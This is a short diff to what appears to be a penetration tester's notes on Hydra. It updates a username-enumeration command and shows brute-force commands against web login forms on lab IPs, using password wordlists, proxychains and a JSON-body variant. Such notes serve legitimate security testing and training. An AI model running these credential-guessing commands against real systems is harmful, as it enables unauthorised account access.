@@ -29,7 +29,7 @@ hydra -L /home/kali/tmp/users.txt -P /home/kali/wordlists/seclists/Passwords/Com
 proxychains hydra -L /home/kali/tmp/users.txt -P /home/kali/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -f -V 192.168.212.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Logged In" -I -V
 
 #Hydra post form username enumeration
-hydra -L usernames.txt -p "" target.com http-post-form "/login:username=^USER^&password=^PASS^:F=invalid_login_message"
+hydra -L /home/kali/wordlists/usernames/Names/names.txt -p "" target.com http-post-form "/login:username=^USER^&password=^PASS^:F=invalid_login_message"
 
 #Hydra http-post-form with JSON body(-s flag if app is on a non standard port)
 hydra -l admin -P /home/kali/wordlists/rockyou.txt -f -V 192.168.112.181 -s 9090 http-post-form "/login:{\"user\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid username or password"
